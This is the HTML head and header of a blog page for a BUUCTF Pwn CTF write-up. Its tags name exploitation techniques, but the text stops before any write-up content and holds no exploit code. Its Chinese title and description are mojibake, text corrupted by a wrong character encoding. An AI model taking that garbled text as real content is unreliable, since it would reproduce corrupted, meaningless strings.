<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"archive.next.arttnba3.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="0x000.ç»ªè®ºBUUCTFæ˜¯ä¸€ä¸ªå·¨å‹CTFé¢˜åº“ï¼Œå¤§è‡´å¯ä»¥ç±»æ¯”OIerä»¬çš„æ´›è°·ä¸€æ ·çš„åœ°æ–¹ï¼Œåœ¨BUUCTFä¸Šæœ‰ç€åˆ†ç±»é½å…¨æ•°é‡åºå¤§çš„å„æ–¹å‘é¢˜ç›®ï¼ŒåŒ…æ‹¬å„å¤§CTFçš„åŸé¢˜ æ­£æ‰€è°“â€ä¸åˆ·BUUéCTFerâ€œï¼ˆå“ªé‡Œæœ‰è¿‡è¿™ç§å¥‡æ€ªçš„è¯å•¦ï¼‰ï¼Œä½œä¸ºä¸€åæ–°æ™‹çš„è’Ÿè’»CTFer&amp;ç½‘å®‰ä¸“ä¸šé€‰æ‰‹ï¼Œå’±ä¹Ÿæ¥åšä¸€åšBUUCTFä¸Šçš„é¢˜ï¼Œå¹¶æŠŠé¢˜è§£åœ¨åšå®¢ä¸Šå­˜æ¡£ä¸€ä»½æ–¹ä¾¿åæ¥è€…å­¦ä¹ ï¼ˆå¿«é†’é†’ï¼Œå“ªé‡Œä¼šæœ‰äººçœ‹ä½ çš„åšå®¢å•¦XD Baby Pwne">
<meta property="og:type" content="article">
<meta property="og:title" content="ã€CTFé¢˜è§£-0x04ã€‘BUUCTF-Pwn write up by arttnb3">
<meta property="og:url" content="http://archive.next.arttnba3.cn/2020/09/08/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x04%E3%80%91BUUOJ-Pwn-write-up-by-arttnb3/index.html">
<meta property="og:site_name" content="arttnba3&#39;s blog">
<meta property="og:description" content="0x000.ç»ªè®ºBUUCTFæ˜¯ä¸€ä¸ªå·¨å‹CTFé¢˜åº“ï¼Œå¤§è‡´å¯ä»¥ç±»æ¯”OIerä»¬çš„æ´›è°·ä¸€æ ·çš„åœ°æ–¹ï¼Œåœ¨BUUCTFä¸Šæœ‰ç€åˆ†ç±»é½å…¨æ•°é‡åºå¤§çš„å„æ–¹å‘é¢˜ç›®ï¼ŒåŒ…æ‹¬å„å¤§CTFçš„åŸé¢˜ æ­£æ‰€è°“â€ä¸åˆ·BUUéCTFerâ€œï¼ˆå“ªé‡Œæœ‰è¿‡è¿™ç§å¥‡æ€ªçš„è¯å•¦ï¼‰ï¼Œä½œä¸ºä¸€åæ–°æ™‹çš„è’Ÿè’»CTFer&amp;ç½‘å®‰ä¸“ä¸šé€‰æ‰‹ï¼Œå’±ä¹Ÿæ¥åšä¸€åšBUUCTFä¸Šçš„é¢˜ï¼Œå¹¶æŠŠé¢˜è§£åœ¨åšå®¢ä¸Šå­˜æ¡£ä¸€ä»½æ–¹ä¾¿åæ¥è€…å­¦ä¹ ï¼ˆå¿«é†’é†’ï¼Œå“ªé‡Œä¼šæœ‰äººçœ‹ä½ çš„åšå®¢å•¦XD Baby Pwne">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.loli.net/2020/08/15/AqJPwtME8FmvHos.png">
<meta property="og:image" content="https://i.loli.net/2020/08/15/5Ze2Nw94jmRxUJF.png">
<meta property="og:image" content="https://i.loli.net/2020/08/14/HPO2siU8DpyfnYG.png">
<meta property="og:image" content="https://i.loli.net/2020/08/14/NxMSvtUf7wZ9iY4.png">
<meta property="og:image" content="https://i.loli.net/2020/08/14/rhUu8p2mc6MyXsi.png">
<meta property="og:image" content="https://i.loli.net/2020/08/14/7fGrIXzylhN49YM.png">
<meta property="og:image" content="https://i.loli.net/2020/08/15/2Oy9SNjZuKEI75t.png">
<meta property="og:image" content="https://i.loli.net/2020/08/15/UcPklJTz8G5brHx.png">
<meta property="og:image" content="https://i.loli.net/2020/08/15/KLPE8bTj2kWszU3.png">
<meta property="og:image" content="https://i.loli.net/2020/08/15/V6ZjsuOYfCUhMLJ.png">
<meta property="og:image" content="https://i.loli.net/2020/09/07/NAUM59LC7FSuZ6V.png">
<meta property="og:image" content="https://i.loli.net/2020/09/07/5FsRKWxZSiME8ug.png">
<meta property="og:image" content="https://i.loli.net/2020/09/07/vwAz9J8tIlN5DpB.png">
<meta property="og:image" content="https://i.loli.net/2020/09/08/U7P6A1HlfkZGsXi.png">
<meta property="og:image" content="https://i.loli.net/2020/09/07/SCp5I7mvXc9HDWQ.png">
<meta property="og:image" content="https://i.loli.net/2020/09/07/vTxCYDnofhqdSKQ.png">
<meta property="og:image" content="https://i.loli.net/2020/09/07/EkemdSOlb9Jj5IM.png">
<meta property="og:image" content="https://i.loli.net/2020/09/07/7iJUWvxtPjVlckS.png">
<meta property="og:image" content="https://i.loli.net/2020/09/07/nZcqDhPo5sFWm6X.png">
<meta property="og:image" content="https://i.loli.net/2020/09/08/IlHxaAwpoKmFdJ5.png">
<meta property="og:image" content="https://i.loli.net/2020/09/08/RyLZ98UPXJp4jQh.png">
<meta property="og:image" content="https://i.loli.net/2020/09/08/wvTE9Qhr18oXU6Z.png">
<meta property="og:image" content="https://i.loli.net/2020/09/08/bQk98h4CdTyFAa5.png">
<meta property="og:image" content="https://i.loli.net/2020/09/08/pAfovxLnPF3Cicu.png">
<meta property="og:image" content="https://i.loli.net/2020/09/08/TXCd5VxRIm2Nbfy.png">
<meta property="og:image" content="https://i.loli.net/2020/09/10/CL1T3UiExsyJbVP.png">
<meta property="og:image" content="https://i.loli.net/2020/09/12/nqPDwE5WHeQsmzT.png">
<meta property="og:image" content="https://i.loli.net/2020/09/12/51JOmdMVjsgAkWN.png">
<meta property="og:image" content="https://i.loli.net/2020/09/12/Ijk8GHiOgxXWVdn.png">
<meta property="og:image" content="https://i.loli.net/2020/09/13/1Y7qukt6NVJlDzd.png">
<meta property="og:image" content="https://i.loli.net/2020/09/13/SOvMLpHGFVaQfZb.png">
<meta property="og:image" content="https://i.loli.net/2020/09/18/utzZo2RkpGUC7Yj.png">
<meta property="og:image" content="https://i.loli.net/2020/09/18/kFVOigZbem3U1yr.png">
<meta property="og:image" content="https://i.loli.net/2020/09/18/ykhU4DgzILKvQXG.png">
<meta property="og:image" content="https://i.loli.net/2020/09/18/Fv6MeQnd4fU8Rmr.png">
<meta property="og:image" content="https://i.loli.net/2020/09/08/TXCd5VxRIm2Nbfy.png">
<meta property="og:image" content="https://i.loli.net/2020/09/18/7AoReBMP9Lr3Ojb.png">
<meta property="og:image" content="https://i.loli.net/2020/09/18/UyvYwOl6x1RH4hE.png">
<meta property="og:image" content="https://i.loli.net/2020/09/18/ZweqQ3kByjGUmVK.png">
<meta property="og:image" content="https://i.loli.net/2020/09/18/Qiglex7ZCfsFhub.png">
<meta property="og:image" content="https://i.loli.net/2020/09/18/81KUdhp5EWb2JgP.png">
<meta property="og:image" content="https://i.loli.net/2020/09/18/KoFCaQM71JZzNgA.png">
<meta property="og:image" content="https://i.loli.net/2020/10/07/usMxPdgyVGUtAEB.png">
<meta property="og:image" content="https://i.loli.net/2020/09/18/GlzDVrQKSOiykoN.png">
<meta property="og:image" content="https://i.loli.net/2020/09/18/QNlFfbPJyCDL9I5.png">
<meta property="og:image" content="https://i.loli.net/2020/09/18/XmBDE6Lk8UHlN1R.png">
<meta property="og:image" content="https://i.loli.net/2020/09/18/XZEnHkaoDL6puN4.png">
<meta property="og:image" content="https://i.loli.net/2020/09/18/KHx7Dz9kULZpIRd.png">
<meta property="og:image" content="https://i.loli.net/2020/09/18/H7PwgMDErGxZcRi.png">
<meta property="og:image" content="https://i.loli.net/2020/10/07/6ZxFokbJUwI2YVS.png">
<meta property="og:image" content="https://i.loli.net/2020/09/19/JX5nSQwg9dFTufU.png">
<meta property="og:image" content="https://i.loli.net/2020/09/20/1nXPY9VqgLaQtmR.png">
<meta property="og:image" content="https://i.loli.net/2020/09/20/dk9jnLSZRt1qwXO.png">
<meta property="og:image" content="https://i.loli.net/2020/09/20/OqJDm4QUE367nWM.png">
<meta property="og:image" content="https://i.loli.net/2020/09/20/2dOMiusme5lUfhc.png">
<meta property="og:image" content="https://i.loli.net/2020/09/20/4RHWBEUrOSaPhXw.png">
<meta property="og:image" content="https://i.loli.net/2020/09/20/lxh7UmuzOJIRvbW.png">
<meta property="og:image" content="https://i.loli.net/2020/09/20/FGmtAInhU9Dcx1a.png">
<meta property="og:image" content="https://i.loli.net/2020/09/20/3MkHWsKtXChuezG.png">
<meta property="og:image" content="https://i.loli.net/2020/09/20/4IebV5KgXMrA9Go.png">
<meta property="og:image" content="https://i.loli.net/2020/09/20/b8JLWav12ru9SFE.png">
<meta property="og:image" content="https://i.loli.net/2020/09/20/WNngpZqb32UfarH.png">
<meta property="og:image" content="https://i.loli.net/2020/09/20/LrGYDRVBwkmJ49K.png">
<meta property="og:image" content="https://i.loli.net/2020/09/20/sh7PJmrCWN2fRBv.png">
<meta property="og:image" content="https://i.loli.net/2020/09/20/I5t8xJdkwloaGeA.png">
<meta property="og:image" content="https://i.loli.net/2020/09/21/Fy45LtX2TbDZmCw.png">
<meta property="og:image" content="https://i.loli.net/2020/09/21/udFMIAQECL71B3D.png">
<meta property="og:image" content="https://i.loli.net/2020/09/21/ODpha1fMLGsxdHN.png">
<meta property="og:image" content="https://i.loli.net/2020/09/21/1SBivHVUXTmd6rM.png">
<meta property="og:image" content="https://i.loli.net/2020/09/21/KLwbUyHQnN3YWTR.png">
<meta property="og:image" content="https://i.loli.net/2020/09/21/ERABfyXm6k1dvZl.png">
<meta property="og:image" content="https://i.loli.net/2020/09/21/OSY69XjyadgBbV2.png">
<meta property="og:image" content="https://i.loli.net/2020/09/21/IX7bcApO3V8axJ1.png">
<meta property="og:image" content="https://i.loli.net/2020/09/21/jJeyg9MLalYGnZX.png">
<meta property="og:image" content="https://i.loli.net/2020/09/21/P4QqLJyplu2xF9r.png">
<meta property="og:image" content="https://i.loli.net/2020/09/21/DQAdo9gNevJrtBz.png">
<meta property="og:image" content="https://i.loli.net/2020/09/21/L5gZjv1rh3bIEt7.png">
<meta property="og:image" content="https://i.loli.net/2020/09/21/GMBR1ib9dHNxlPX.png">
<meta property="og:image" content="https://i.loli.net/2020/09/21/nBZbpiVdHPRvu9c.png">
<meta property="og:image" content="https://i.loli.net/2020/09/21/aZJExgI4UqDuPoj.png">
<meta property="og:image" content="https://i.loli.net/2020/09/30/VEjFKYhibtqHfs6.png">
<meta property="og:image" content="https://i.loli.net/2020/09/30/WAOCpdZMVRlSxgm.png">
<meta property="og:image" content="https://i.loli.net/2020/10/07/XARM5QmBzFadtWi.png">
<meta property="og:image" content="https://i.loli.net/2020/10/07/IBAZ6ChTOrQwonp.png">
<meta property="og:image" content="https://i.loli.net/2020/10/07/glLRkSdY3GufeOv.png">
<meta property="og:image" content="https://i.loli.net/2020/10/07/9n7EyWL5OC3aIcm.png">
<meta property="og:image" content="https://i.loli.net/2020/10/09/6YLBG8h3kfrqEFl.png">
<meta property="og:image" content="https://i.loli.net/2020/10/09/Il3iOrAao5phSXm.png">
<meta property="og:image" content="https://i.loli.net/2020/10/09/kxmOadD1Py7GYLM.png">
<meta property="og:image" content="https://i.loli.net/2020/10/09/wMdhOJgrpDZCicA.png">
<meta property="og:image" content="https://i.loli.net/2020/10/09/cusBMX2AOeT7yEt.png">
<meta property="og:image" content="https://i.loli.net/2020/10/09/hGbO9NaLnkory3I.png">
<meta property="og:image" content="https://i.loli.net/2020/10/09/85mfFgLiZVYXeuN.png">
<meta property="og:image" content="https://i.loli.net/2020/10/09/5Z3rzc8pPb61hjL.png">
<meta property="og:image" content="https://i.loli.net/2020/10/09/aqwxIRMizvbVkPF.png">
<meta property="og:image" content="https://i.loli.net/2020/10/09/FHvp3yewxTmkG6Z.png">
<meta property="og:image" content="https://i.loli.net/2020/10/09/q8KI9ocLn1NybWz.png">
<meta property="og:image" content="https://i.loli.net/2020/09/13/ip9xYzyfsF8eSvU.png">
<meta property="og:image" content="https://i.loli.net/2020/09/13/QX6bdK57hjWCyrG.png">
<meta property="og:image" content="https://i.loli.net/2020/09/13/5RsPUNZAyV2ot7f.png">
<meta property="og:image" content="https://i.loli.net/2020/09/13/eBiLZDC9uwRxvIP.png">
<meta property="og:image" content="https://i.loli.net/2020/09/14/TcMSfPtdDmQhuAC.png">
<meta property="og:image" content="https://i.loli.net/2020/11/28/cCwJmaSEt5Kxqeg.png">
<meta property="og:image" content="https://image.3001.net/images/20151128/14487175105930.png!small">
<meta property="og:image" content="https://i.loli.net/2020/11/29/CJxnp4FVN6RoujY.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190522125217-5fced1dc-7c4d-1.png">
<meta property="og:image" content="https://i.loli.net/2020/10/19/2FfsUenMSKoQ7qY.png">
<meta property="og:image" content="https://i.loli.net/2020/10/19/PDEMKizc5g2HIyl.png">
<meta property="og:image" content="https://i.loli.net/2020/10/19/5HYQqUcMGavCsdS.png">
<meta property="og:image" content="https://i.loli.net/2020/11/15/zhfrI8Kpij7NWT6.png">
<meta property="og:image" content="https://i.loli.net/2020/11/15/cmGeARE3V18x9H2.png">
<meta property="og:image" content="https://i.loli.net/2020/11/15/S46DkWpHcz5qLiF.png">
<meta property="og:image" content="https://i.loli.net/2020/10/09/Iy2iukBamRfXd1x.png">
<meta property="og:image" content="https://i.loli.net/2020/10/09/MzHjLZfqXTpBxaF.png">
<meta property="og:image" content="https://i.loli.net/2020/10/09/3pdunR4j1yBtrOL.png">
<meta property="og:image" content="https://i.loli.net/2020/11/15/ci6yp5J3jWVagZK.png">
<meta property="og:image" content="https://i.loli.net/2020/10/09/dhNruafBqwiGHj7.png">
<meta property="og:image" content="https://i.loli.net/2020/10/09/BAIuUsgEq8VkCD2.png">
<meta property="og:image" content="https://i.loli.net/2020/10/09/L43Evc2IVdUWkCF.png">
<meta property="og:image" content="c:%5CUsers%5CSUR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1606747425236.png">
<meta property="og:image" content="https://i.loli.net/2020/11/30/nxCyhzXdESge4OH.png">
<meta property="og:image" content="https://i.loli.net/2020/11/30/ldt9YWcke8NvpUT.png">
<meta property="og:image" content="c:%5CUsers%5CSUR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1606752784211.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/tKG7EIMTbcS3wLa.png">
<meta property="og:image" content="https://i.loli.net/2020/11/30/n5M1HGzuTxy7QZb.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/P9gryD43xBNawEL.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/uifxqJUW9rIQpS1.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/Mdng1Imo6tPrkyC.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/MIteH4sl7aKJORj.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/WXw721cUfC9LDqQ.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/82JX5c3gmUfhuBd.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/zX2NEbFpBKWCamq.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/9tqkz3s1byJDBId.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/BGsMI7SmyxXAbLD.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/RVDX2UIegLHboN4.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/QZ9KJTgDafe3NMh.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/5lLM1IuKhdqHJwQ.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/WqAa8StsGKveMTw.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/BsjidqO7gZcCfEv.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/ETx7LSG5zC9Zeul.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/g7qk6h8j2BM4Y3T.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/2zWulrZ5IOGcELP.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/r4U1m3TiBjohkZF.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/j8LHM4DzXE6pZ5m.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/zPCHqKLigBI4Nwd.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/W6sVY2Hp4TFECBO.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/jIJCdMwZ9ufy3ti.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/eI31RvsilqYKpTZ.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/3KvIRtcrT1z9LUm.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/NILo7xYAvaPjm9R.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/lJIRWsXmNeEP67B.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/dzUnkYrhxHR5EiB.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/hDVSnkOyfovmQdL.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/u3UwrkKvGmgxW59.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/EbFBZKn2tPakdlg.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/ConYPhEF6378GWA.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/4lBnGzRhCecZ28H.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/mDEwn7F62VP9klh.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/AbWlLCKU6Sdxn5D.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/Ym2n6FaAwBNOuV7.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/E5oFjm9cVOnTGXv.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/yDu6BFCNoMLItQd.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/Tk48oH5yF7NPvrp.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/QHNE6DmMORUiGcF.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/tUa3TvpBgSWh4bR.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/NVODiTzqfhtI1Hy.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/FxEkX38erav47Ad.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/iyIftbNOM4CrTka.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/IWHrRozGqyLDfUX.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/o9PlK4ECbHuFiN6.png">
<meta property="og:image" content="https://i.loli.net/2020/12/03/mh1HLy7cvGrCUAQ.png">
<meta property="og:image" content="https://i.loli.net/2020/12/03/GBrOqIdPnDluXhb.png">
<meta property="og:image" content="https://i.loli.net/2020/12/03/RXyTELuGiqKCSh7.png">
<meta property="og:image" content="https://i.loli.net/2020/12/03/DlinxIM76eTLu8S.png">
<meta property="og:image" content="https://i.loli.net/2020/12/03/PNyq3WFTU8mtYSM.png">
<meta property="og:image" content="https://i.loli.net/2020/12/03/AG3oW65aVeCzMgt.png">
<meta property="og:image" content="https://i.loli.net/2020/12/03/5hSCU9J7GdHwvWK.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/wKnv9UQdNWiGAgq.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/zZDt4oywbmu2Rgp.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/Uz1lFs8roh9uSye.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/9YlXciZazB3WoQU.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/e2jUYcNvISPsZqy.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/j2BrJifVY48SbTK.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/MHwmRf2q1tEk9ro.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/xLOq52VBcJ74bUm.png">
<meta property="og:image" content="https://i.loli.net/2020/12/03/xhMBIPmZ2V8RHyu.png">
<meta property="og:image" content="https://i.loli.net/2020/12/03/6Fg3EXu5rqiH9wQ.png">
<meta property="og:image" content="https://i.loli.net/2020/12/03/m2nw4WfoP8cGgsS.png">
<meta property="og:image" content="https://i.loli.net/2020/12/03/ZkwVJ34ifBMCytQ.png">
<meta property="og:image" content="c:%5CUsers%5CSUR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1606984117052.png">
<meta property="og:image" content="https://i.loli.net/2020/12/03/yKXTYzOgBD4HIPW.png">
<meta property="og:image" content="https://i.loli.net/2020/12/03/xyaWKuVEgNkX7rs.png">
<meta property="og:image" content="https://i.loli.net/2020/12/03/wRoqFJ6Z5VXpLeM.png">
<meta property="og:image" content="https://i.loli.net/2020/12/03/SjcMlvYBCKwhfp6.png">
<meta property="og:image" content="https://i.loli.net/2020/12/03/w2WaI8uy7Sb1hsz.png">
<meta property="og:image" content="https://i.loli.net/2020/12/03/R5qOZ8lECUYPbN6.png">
<meta property="og:image" content="https://i.loli.net/2020/12/03/9dq2QrJkFpe1uwt.png">
<meta property="og:image" content="https://i.loli.net/2020/12/04/e1UhWOLn3pu7BXd.png">
<meta property="og:image" content="https://i.loli.net/2020/12/04/aucnheQl23Z8CbK.png">
<meta property="og:image" content="https://i.loli.net/2020/12/04/6HFv8WPtpDZcbgN.png">
<meta property="og:image" content="https://i.loli.net/2020/12/04/uveEXY9RBpGIofU.png">
<meta property="og:image" content="https://i.loli.net/2020/12/04/V4Io3j6Zyqaipx5.png">
<meta property="og:image" content="https://i.loli.net/2020/12/04/4g6RJGxlf73ZTAB.png">
<meta property="og:image" content="https://i.loli.net/2020/12/04/fBGecSvgaFmsdCb.png">
<meta property="og:image" content="https://i.loli.net/2020/12/04/GmnYAjS7r6DUbpC.png">
<meta property="og:image" content="https://i.loli.net/2020/12/04/uH6V1kLP3M5TizI.png">
<meta property="og:image" content="https://i.loli.net/2020/12/04/K7psfAMFocnalTy.png">
<meta property="og:image" content="https://i.loli.net/2020/12/04/XHYVtGCxol92dNE.png">
<meta property="og:image" content="https://i.loli.net/2020/12/04/rScmVH2X87ob5iB.png">
<meta property="og:image" content="https://i.loli.net/2020/12/04/RuA5Pk3QrJqXKHd.png">
<meta property="og:image" content="https://i.loli.net/2020/12/04/IefOqdQ4E6yBMKZ.png">
<meta property="og:image" content="https://i.loli.net/2020/12/04/gXN7KSE3T4dzLob.png">
<meta property="og:image" content="https://i.loli.net/2020/12/04/l7ST1q2FcrGWbUM.png">
<meta property="og:image" content="https://i.loli.net/2020/12/04/uZlcnrhgJo23zpW.png">
<meta property="og:image" content="https://i.loli.net/2020/10/19/kJSyCIWmsLdoaOD.png">
<meta property="og:image" content="https://i.loli.net/2020/10/07/9iQUjlYXTmzAKoB.png">
<meta property="og:image" content="https://i.loli.net/2020/10/07/zrNR46ytfJ2gcDq.png">
<meta property="og:image" content="https://i.loli.net/2020/10/07/LXQr9f2BShwG1bC.png">
<meta property="og:image" content="https://i.loli.net/2020/10/07/wzrb1uSvc49oaeO.png">
<meta property="og:image" content="https://i.loli.net/2020/10/07/QDHPlT9WFS3gx6K.png">
<meta property="og:image" content="https://i.loli.net/2020/10/07/TwVOht7dcnsZzbN.png">
<meta property="article:published_time" content="2020-09-07T18:09:30.000Z">
<meta property="article:modified_time" content="2020-12-11T17:24:11.411Z">
<meta property="article:author" content="arttnba3">
<meta property="article:tag" content="ä¿¡æ¯å®‰å…¨">
<meta property="article:tag" content="PWN">
<meta property="article:tag" content="å †">
<meta property="article:tag" content="ROP">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="ret2text">
<meta property="article:tag" content="python">
<meta property="article:tag" content="æ ˆè¿ç§»">
<meta property="article:tag" content="ret2csu">
<meta property="article:tag" content="ret2libc">
<meta property="article:tag" content="Integer Overflow">
<meta property="article:tag" content="Fastbin Attack">
<meta property="article:tag" content="Unsorted bin Attack">
<meta property="article:tag" content="one_gadget">
<meta property="article:tag" content="SROP">
<meta property="article:tag" content="canary">
<meta property="article:tag" content="gotè¡¨åŠ«æŒ">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2020/08/15/AqJPwtME8FmvHos.png">

<link rel="canonical" href="http://archive.next.arttnba3.cn/2020/09/08/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x04%E3%80%91BUUOJ-Pwn-write-up-by-arttnb3/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>ã€CTFé¢˜è§£-0x04ã€‘BUUCTF-Pwn write up by arttnb3 | arttnba3's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="alternate" href="/atom.xml" title="arttnba3's blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">arttnba3's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">- arttnba3çš„éšç§˜å°çª -</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

  <a href="https://github.com/arttnba3" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

